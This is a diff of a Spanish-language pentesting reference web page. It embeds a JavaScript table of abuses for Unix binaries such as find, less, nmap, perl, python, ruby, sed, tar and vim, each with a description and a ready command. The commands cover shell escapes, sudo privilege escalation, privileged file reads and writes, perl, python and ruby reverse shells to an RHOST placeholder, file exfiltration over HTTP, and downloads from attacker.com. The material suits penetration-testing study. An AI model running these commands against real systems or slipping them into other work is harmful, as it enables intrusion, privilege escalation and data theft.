+            sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "sudo env /bin/sh" }
+          },
+          find: {
+            shell: { description: "Puede usarse para escapar de entornos restringidos al generar una shell interactiva del sistema.", command: "find . -exec /bin/sh \\; -quit" },
+            file_write: { description: "Escribe datos en archivos y puede usarse para realizar escrituras con privilegios elevados o escribir archivos fuera de un sistema de archivos restringido.", command: "LFILE=[archivo_para_escribir]\nfind / -fprintf \"$LFILE\" DATA -quit" },
+            sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "sudo find . -exec /bin/sh \\; -quit" }
+          },
+          grep: {
+            file_read: { description: "Lee datos de archivos y puede usarse para realizar lecturas con privilegios elevados o revelar archivos fuera de un sistema de archivos restringido.", command: "LFILE=[archivo_para_leer]\ngrep '' $LFILE" },
+            sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "LFILE=[archivo_para_leer]\nsudo grep '' $LFILE" }
+          },
+          less: {
+            shell: { description: "Puede usarse para escapar de entornos restringidos al generar una shell interactiva del sistema.", command: "less /etc/profile\n!/bin/sh\n\n# Alternativa\nVISUAL=\"/bin/sh -c '/bin/sh'\" less /etc/profile\nv\n\n# Alternativa\nless /etc/profile\nv:shell" },
+            file_read: { description: "Lee datos de archivos y puede usarse para realizar lecturas con privilegios elevados o revelar archivos fuera de un sistema de archivos restringido.", command: "less [archivo_para_leer]\n\n# Cuando less es paginador\nless /etc/profile :e [archivo_para_leer]" },
+            file_write: { description: "Escribe datos en archivos y puede usarse para realizar escrituras con privilegios elevados o escribir archivos fuera de un sistema de archivos restringido.", command: "echo DATA | less s[archivo_para_escribir] q\n\n# Invoca editor\nless [archivo_para_escribir] v" },
+            sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "sudo less /etc/profile\n!/bin/sh" }
+          },
+          more: {
+            shell: { description: "Puede usarse para escapar de entornos restringidos al generar una shell interactiva del sistema.", command: "TERM= more /etc/profile\n!/bin/sh" },
+            file_read: { description: "Lee datos de archivos y puede usarse para realizar lecturas con privilegios elevados o revelar archivos fuera de un sistema de archivos restringido.", command: "more [archivo_para_leer]" },
+            sudo: { description: "Si se permite que el binario se ejecute como superusuario mediante sudo, no pierde los privilegios elevados y puede ser utilizado para acceder al sistema de archivos, escalar o mantener el acceso privilegiado.", command: "TERM= sudo more /etc/profile\n!/bin/sh" }
+          },
+          mv: {
+            sudo: { description: "Si se permite que el binario se ejecute como superusuario mediante sudo, no pierde los privilegios elevados y puede ser utilizado para acceder al sistema de archivos, escalar o mantener el acceso privilegiado.", command: "LFILE=[archivo_para_escribir]\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo mv $TF $LFILE" }
+          },
+          nano: {
+            shell: { description: "Puede usarse para salir de entornos restringidos al generar un shell de sistema interactivo.", command: "nano\n^R^X\nreset; sh 1>&0 2>&0\n\n# Alternativa\nnano -s /bin/sh\n/bin/sh\n^T" },
+            file_read: { description: "Lee datos de archivos, puede usarse para realizar lecturas privilegiadas o revelar archivos fuera de un sistema de archivos restringido.", command: "nano [archivo_para_leer]" },
+            file_write: { description: "Escribe datos en archivos, puede usarse para realizar escrituras privilegiadas o escribir archivos fuera de un sistema de archivos restringido.", command: "nano [archivo_para_escribir] DATA ^O" },
+            sudo: { description: "Si se permite que el binario se ejecute como superusuario mediante sudo, no pierde los privilegios elevados y puede ser utilizado para acceder al sistema de archivos, escalar o mantener el acceso privilegiado.", command: "sudo nano\n^R^X\nreset; sh 1>&0 2>&0" }
+          },
+          nmap: {
+            shell: { description: "Puede usarse para salir de entornos restringidos al generar un shell de sistema interactivo.", command: "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nnmap --script=$TF\n\n# Modo interactivo (versiones 2.02 a 5.21)\nnmap --interactive\nnmap> !sh" },
+            file_upload: { description: "Puede exfiltrar archivos a través de la red. Envía un archivo local a través de TCP.", command: "RHOST=[IP-URL]\nRPORT=8080\nLFILE=[archivo_para_enviar]\nnmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE" },
+            file_download: { description: "Puede descargar archivos remotos. Recupera un archivo remoto a través de TCP.", command: "RHOST=[IP-URL]\nRPORT=8080\nTF=$(mktemp -d)\nLFILE=[archivo_para_descargar]\nnmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE" },
+            file_read: { description: "Lee datos de archivos, puede usarse para realizar lecturas privilegiadas o revelar archivos fuera de un sistema de archivos restringido.", command: "TF=$(mktemp)\necho 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);' > $TF\nnmap --script=$TF\n\n# Alternativa\nnmap -iL [archivo_para_leer]" },
+            file_write: { description: "Escribe datos en archivos, puede usarse para realizar escrituras privilegiadas o escribir archivos fuera de un sistema de archivos restringido.", command: "TF=$(mktemp)\necho 'local f=io.open(\"file_to_write\", \"wb\"); f:write(\"data\"); io.close(f);' > $TF\nnmap --script=$TF\n\n# Alternativa\nLFILE=[archivo_para_escribir]\nnmap -oG=$LFILE DATA" },
+            sudo: { description: "Si se permite que el binario se ejecute como superusuario mediante sudo, no pierde los privilegios elevados y puede ser utilizado para acceder al sistema de archivos, escalar o mantener el acceso privilegiado.", command: "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF\n\n# Modo interactivo (versiones 2.02 a 5.21)\nsudo nmap --interactive\nnmap> !sh" }
+          },
+          perl: {
+            shell: { description: "Puede usarse para salir de entornos restringidos al generar un shell de sistema interactivo.", command: "perl -e 'exec \"/bin/sh\";'" },
+            reverse_shell: { description: "Puede usarse para salir de entornos restringidos al generar un shell de sistema interactivo.", command: "export RHOST=[IP-URL]\nRPORT=443\nperl -e 'use Socket;$i=\"$ENV{RHOST}\";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" },
+            file_read: { description: "Lee datos de archivos, puede usarse para realizar lecturas privilegiadas o revelar archivos fuera de un sistema de archivos restringido.", command: "LFILE=[archivo_para_leer]\nperl -ne print $LFILE" },
+            sudo: { description: "Si se permite que el binario se ejecute como superusuario mediante sudo, no pierde los privilegios elevados y puede ser utilizado para acceder al sistema de archivos, escalar o mantener el acceso privilegiado.", command: "sudo perl -e 'exec \"/bin/sh\";'" }
+          },
+          python: {
+            shell: { description: "Se puede utilizar para escapar de entornos restringidos mediante la creación de una shell del sistema interactivo.", command: "python -c 'import os; os.system(\"/bin/sh\")'" },
+            reverse_shell: { description: "Puede enviar un shell inverso a un atacante que esté escuchando, para abrir un acceso remoto a la red.", command: "export RHOST=[IP-URL]\nRPORT=443\npython -c 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'" },
+            file_upload: { description: "Puede exfiltrar archivos a través de la red. Envía el archivo local mediante el parámetro \"d\" en una solicitud HTTP POST.", command: "export URL=[URL]\nLFILE=[archivo_para_enviar]\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))'" },
+            file_download: { description: "Puede descargar archivos remotos. Obtén un archivo remoto mediante una solicitud HTTP GET.", command: "export URL=http://attacker.com/archivo_para_descargar\nLFILE=[archivo_a_guardar]\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])'" },
+            file_read: { description: "Lee datos de archivos, por lo que puede utilizarse para realizar lecturas con privilegios o divulgar archivos fuera de un sistema de archivos restringido.", command: "python -c 'print(open(\"archivo_para_leer\").read())'" },
+            file_write: { description: "Escribe datos en archivos, puede usarse para hacer escrituras privilegiadas o escribir archivos fuera de un sistema de archivos restringido.", command: "python -c 'open(\"archivo_para_escribir\",\"w+\").write(\"DATA\")'" },
+            sudo: { description: "Si el binario tiene permiso para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede utilizarse para acceder al sistema de archivos, escalar privilegios o mantener acceso privilegiado.", command: "sudo python -c 'import os; os.system(\"/bin/sh\")'" }
+          },
+          ruby: {
+            shell: { description: "Puede usarse para escapar de entornos restringidos generando un shell del sistema interactivo.", command: "ruby -e 'exec \"/bin/sh\"'" },
+            reverse_shell: { description: "Puede enviar un reverse shell a un atacante en escucha para abrir un acceso remoto a la red.", command: "export RHOST=[IP_URL]\nRPORT=443\nruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'" },
+            file_upload: { description: "Puede exfiltrar archivos en la red. Sirve archivos en la carpeta local ejecutando un servidor HTTP.", command: "export LPORT=8888\nruby -run -e httpd . -p $LPORT" },
+            file_download: { description: "Puede descargar archivos remotos. Obtiene un archivo remoto mediante una solicitud HTTP GET.", command: "export URL=http://attacker.com/archivo_para_descargar\nLFILE=[archivo_para_guardar]\nruby -e 'require \"open-uri\"; download = open(ENV[\"URL\"]); IO.copy_stream(download, ENV[\"LFILE\"])'" },
+            file_read: { description: "Lee datos de archivos, puede usarse para hacer lecturas privilegiadas o divulgar archivos fuera de un sistema de archivos restringido.", command: "ruby -e 'puts File.read(\"archivo_para_leer\")'" },
+            file_write: { description: "Escribe datos en archivos, puede usarse para hacer escrituras privilegiadas o escribir archivos fuera de un sistema de archivos restringido.", command: "ruby -e 'File.open(\"archivo_para_escribir\", \"w+\") { |f| f.write(\"DATA\") }'" },
+            sudo: { description: "Si el binario tiene permitido ejecutarse como superusuario mediante sudo, no descarta los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "sudo ruby -e 'exec \"/bin/sh\"'" }
+          },
+          sed: {
+            shell: { description: "Puede usarse para escapar de entornos restringidos generando un shell del sistema interactivo. Solo versión GNU. Además, requiere bash.", command: "sed -n '1e exec sh 1>&0' /etc/hosts\n\n# Alternativa\nsed e" },
+            command: { description: "Puede usarse para escapar de entornos restringidos ejecutando comandos del sistema no interactivos. Solo versión GNU.", command: "sed -n '1e id' /etc/hosts" },
+            file_read: { description: "Lee datos de archivos, puede usarse para hacer lecturas privilegiadas o divulgar archivos fuera de un sistema de archivos restringido.", command: "LFILE=[archivo_para_leer]\nsed '' \"$LFILE\"" },
+            file_write: { description: "Escribe datos en archivos, puede usarse para hacer escrituras privilegiadas o escribir archivos fuera de un sistema de archivos restringido.", command: "LFILE=[archivo_para_escribir]\nsed -n \"1s/.*/DATA/w $LFILE\" /etc/hosts" },
+            sudo: { description: "Si el binario tiene permitido ejecutarse como superusuario mediante sudo, no descarta los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado. Solo versión GNU. Además, requiere bash.", command: "sudo sed -n '1e exec sh 1>&0' /etc/hosts" }
+          },
+          sh: {
+            shell: { description: "Puede usarse para escapar de entornos restringidos al generar una shell interactiva del sistema.", command: "/bin/sh" },
+            sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "sudo /bin/sh" }
+          },
+          su: {
+            sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "sudo su" }
+          },
+          sudo: {
+            sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "sudo sudo /bin/sh" }
+          },
+          tar: {
+            shell: { description: "Puede usarse para escapar de entornos restringidos al generar una shell interactiva del sistema.", command: "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh" },
+            sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh" }
+          },
+          vi: {
+            shell: { description: "Puede usarse para escapar de entornos restringidos al generar una shell interactiva del sistema.", command: "vi -c ':!/bin/sh' /dev/null" },
+            sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "sudo vi -c ':!/bin/sh' /dev/null" }
+          },
+          vim: {
+            shell: { description: "Puede usarse para escapar de entornos restringidos al generar una shell interactiva del sistema.", command: "vim -c ':!/bin/sh'" },
+            sudo: { description: "Si el binario está permitido para ejecutarse como superusuario mediante sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener acceso privilegiado.", command: "sudo vim -c ':!/bin/sh'" }
+          }
+        };
 
-    function displayExploits() {
-        const binary = document.getElementById('binarySelect').value;
-        const tableBody = document.querySelector('#exploitTable tbody');
-        const noSelection = document.querySelector('.no-selection');
-        const table = document.getElementById('exploitTable');
-        tableBody.innerHTML = '';
+        function displayExploits() {
+          const binary = document.getElementById('binarySelect').value;
+          const tableBody = document.querySelector('#exploitTable tbody');
+          const noSelection = document.querySelector('.no-selection');
+          const table = document.getElementById('exploitTable');
+          tableBody.innerHTML = '';
 
-        if (binary) {
+          if (binary) {
             noSelection.style.display = 'none';
             table.style.display = 'table';
 
             const binaryExploits = exploits[binary];
             if (binaryExploits) {
-                Object.keys(binaryExploits).forEach(key => {
-                    const exploit = binaryExploits[key];
-                    const row = document.createElement('tr');
-                    row.innerHTML = `
+              Object.keys(binaryExploits).forEach(key => {
+                const exploit = binaryExploits[key];
+                const row = document.createElement('tr');
+                row.innerHTML = `
                         <td style="padding: 9px; border-bottom: 1px solid #333; color: #FF0808;">${key.toUpperCase()}</td>
                         <td style="padding: 9px; border-bottom: 1px solid #333;">
                             <div style="margin-bottom: 6px; color: #ddd;">${exploit.description}</div>
                             <pre style="background: #000; padding: 8px; border-radius: 4px; color: #fff; font-size: 0.78rem; white-space: pre-wrap; overflow-x: auto;">${exploit.command}</pre>
                         </td>
                     `;
-                    tableBody.appendChild(row);
-                });
+                tableBody.appendChild(row);
+              });
             }
-        } else {
+          } else {
             noSelection.style.display = 'block';
             table.style.display = 'none';
+          }
         }
-    }
-</script>
+      </script>
 
-<!-- TOOL END -->
+      <!-- TOOL END -->
 
-</div>
-</section>
+    </div>
+  </section>
 
-    <a href="pentestools.html" class="card-button">
-        <i class="ti ti-device-imac-cog" style="color: var(--accent); margin-right: 10px; font-size: 1.4rem;"></i>
-        Volver a Pentesting Tools
-    </a>
-    
-        <br><br><br><br>
+  <a href="pentestools.html" class="card-button">
+    <i class="ti ti-device-imac-cog" style="color: var(--accent); margin-right: 10px; font-size: 1.4rem;"></i>
+    Volver a Pentesting Tools
+  </a>
 
-<footer>
+  <br><br><br><br>
+
+  <footer>
     <div class="footer-content">
 
-        <div>
-            <strong style="display:block; margin-bottom:12px;">HERRAMIENTAS</strong>
-            <a href="pentestools.html" class="footer-link">Pentesting Tools</a><br>
-            <a href="osintools.html" class="footer-link">OSINT Tools </a><br>
-            <a href="aitools.html" class="footer-link">AI Tools</a>
-        </div>
-        
-        <div>
-            <strong style="display:block; margin-bottom:12px;">APUNTES</strong>
-            <a href="replinux.html" class="footer-link">Repositorio Linux</a><br>
-            <a href="repwindows.html" class="footer-link">Repositorio Windows</a><br>
-            <a href="pentestingweb.html" class="footer-link">Pentesting Web</a><br>
-            <a href="autoproteccion.html" class="footer-link">Autoprotección Digital</a><br>
-            <a href="ejpt.html" class="footer-link">EJPTv2*</a><br>
-            <a href="howtoattack.html" class="footer-link">Guía de Ataque*</a><br>
-            <a href="writeups.html" class="footer-link">CTF Writeups</a>
-        </div>
+      <div>
+        <strong style="display:block; margin-bottom:12px;">HERRAMIENTAS</strong>
+        <a href="pentestools.html" class="footer-link">Pentesting Tools</a><br>
+        <a href="osintools.html" class="footer-link">OSINT Tools </a><br>
+        <a href="aitools.html" class="footer-link">AI Tools</a>
+      </div>
 
-        <div>
-            <strong style="display:block; margin-bottom:12px;">MISCELÁNEA</strong>
-            <a href="ctf.html" class="footer-link">Mi Reto CTF</a><br>
-            <a href="wallpapers.html" class="footer-link">Wallpapers</a><br>
-            <a href="parches.html" class="footer-link">Parches</a><br>
-            <a href="https://www.youtube.com/@SF01Ghost" target="_blank" class="footer-link">Hacking Music</a><br>
-            <a href="terminal.html" class="footer-link">Terminal Linux</a><br>
-            <a href="whoami.html" class="footer-link">Whoami</a>
-        </div>
+      <div>
+        <strong style="display:block; margin-bottom:12px;">APUNTES</strong>
+        <a href="replinux.html" class="footer-link">Repositorio Linux</a><br>
+        <a href="repwindows.html" class="footer-link">Repositorio Windows</a><br>
+        <a href="pentestingweb.html" class="footer-link">Pentesting Web</a><br>
+        <a href="autoproteccion.html" class="footer-link">Autoprotección Digital</a><br>
+        <a href="ejpt.html" class="footer-link">EJPTv2*</a><br>
+        <a href="howtoattack.html" class="footer-link">Guía de Ataque*</a><br>
+        <a href="writeups.html" class="footer-link">CTF Writeups</a>
+      </div>
 
-        <div>
-            <strong style="display:block; margin-bottom:12px;">REDES SOCIALES</strong>
-            <a href="https://www.linkedin.com/in/mayuso-eh/" target="_blank" class="footer-link">LinkedIn</a><br>
-            <a href="https://github.com/MAyusoEH" target="_blank" class="footer-link">GitHub</a><br>
-            <a href="https://www.youtube.com/@SF01Ghost" target="_blank" class="footer-link">YouTube</a>
-        </div>
+      <div>
+        <strong style="display:block; margin-bottom:12px;">MISCELÁNEA</strong>
+        <a href="ctf.html" class="footer-link">Mi Reto CTF</a><br>
+        <a href="wallpapers.html" class="footer-link">Wallpapers</a><br>
+        <a href="parches.html" class="footer-link">Parches</a><br>
+        <a href="https://www.youtube.com/@SF01Ghost" target="_blank" class="footer-link">Hacking Music</a><br>
+        <a href="terminal.html" class="footer-link">Terminal Linux</a><br>
+        <a href="whoami.html" class="footer-link">Whoami</a>
+      </div>
+
+      <div>
+        <strong style="display:block; margin-bottom:12px;">REDES SOCIALES</strong>
+        <a href="https://www.linkedin.com/in/mayuso-eh/" target="_blank" class="footer-link">LinkedIn</a><br>
+        <a href="https://github.com/MAyusoEH" target="_blank" class="footer-link">GitHub</a><br>
+        <a href="https://www.youtube.com/@SF01Ghost" target="_blank" class="footer-link">YouTube</a>
+      </div>
     </div>
 
     <div style="margin-top:50px; display:flex; align-items:center; justify-content:center; gap:25px; flex-wrap:wrap;">
-        <img src="assets/img/mayured.png" alt="Logo" style="height:80px;">
+      <img src="assets/img/mayured.png" alt="Logo" style="height:80px;">
 
-        <script type='text/javascript' src='https://storage.ko-fi.com/cdn/widget/Widget_2.js'></script>
-        <script type='text/javascript'>kofiwidget2.init('Invítame a un café', '#cc2525', 'O4O31LGS09');kofiwidget2.draw();</script>
+      <script type='text/javascript' src='https://storage.ko-fi.com/cdn/widget/Widget_2.js'></script>
+      <script
+        type='text/javascript'>kofiwidget2.init('Invítame a un café', '#cc2525', 'O4O31LGS09'); kofiwidget2.draw();</script>
 
-        <div>
-            <p style="margin:8px 0 4px 0; color: var(--text)">Contacto: <a href="mailto:sf01ghost@gmail.com" style="color:#E3E3E3;">sf01ghost@gmail.com</a></p>
-        </div>
+      <div>
+        <p style="margin:8px 0 4px 0; color: var(--text)">Contacto: <a href="mailto:sf01ghost@gmail.com"
+            style="color:#E3E3E3;">sf01ghost@gmail.com</a></p>
+      </div>
     </div>
 
     <p style="margin-top:20px; font-size:0.85em; opacity:0.8; color: var(--text)">
-        © 2026 Miguel Ángel Ayuso Jiménez • This work is licensed under CC BY-NC-ND 4.0
+      © 2026 Miguel Ángel Ayuso Jiménez • This work is licensed under CC BY-NC-ND 4.0
     </p>
     <br>
-</footer>
+  </footer>
 
-    <div class="back-to-top" onclick="window.scrollTo({top: 0, behavior: 'smooth'});">
-        ↑
-    </div>
+  <div class="back-to-top" onclick="window.scrollTo({top: 0, behavior: 'smooth'});">
+    ↑
+  </div>
 
-    <script>
-        const canvas = document.getElementById('matrix');
-        const ctx = canvas.getContext('2d');
-        function resize() {
-            canvas.height = window.innerHeight;
-            canvas.width = window.innerWidth;
-        }
-        resize();
-        window.addEventListener('resize', resize);
-      
-        const chars = '01アイウエオ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
-        const fontSize = 13;
-        const columns = canvas.width / fontSize;
-        const drops = Array(Math.floor(columns)).fill(1);
-      
-        function draw() {
-            ctx.fillStyle = 'rgba(10, 10, 18, 0.06)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = '#00aaff';
-            ctx.font = `${fontSize}px monospace`;
-            for (let i = 0; i < drops.length; i++) {
-                const text = chars[Math.floor(Math.random() * chars.length)];
-                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-                drops[i]++;
-            }
-        }
-        setInterval(draw, 35);
-    </script>
+  <script>
+    const canvas = document.getElementById('matrix');
+    const ctx = canvas.getContext('2d');
+    function resize() {
+      canvas.height = window.innerHeight;
+      canvas.width = window.innerWidth;
+    }
+    resize();
+    window.addEventListener('resize', resize);
+
+    const chars = '01アイウエオ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    const fontSize = 13;
+    const columns = canvas.width / fontSize;
+    const drops = Array(Math.floor(columns)).fill(1);
+
+    function draw() {
+      ctx.fillStyle = 'rgba(10, 10, 18, 0.06)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = '#00aaff';
+      ctx.font = `${fontSize}px monospace`;
+      for (let i = 0; i < drops.length; i++) {
+        const text = chars[Math.floor(Math.random() * chars.length)];
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      }
+    }
+    setInterval(draw, 35);
+  </script>
 </body>
+
 </html>
